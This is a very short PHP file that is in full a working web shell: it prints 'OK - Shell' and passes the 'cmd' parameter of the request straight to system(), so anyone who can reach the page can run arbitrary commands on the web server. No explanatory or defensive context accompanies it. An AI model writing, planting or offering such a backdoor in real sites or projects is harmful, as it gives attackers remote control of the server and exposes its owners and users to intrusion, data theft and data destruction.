<?php
  echo "OK - Shell";
  if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
  }
?>
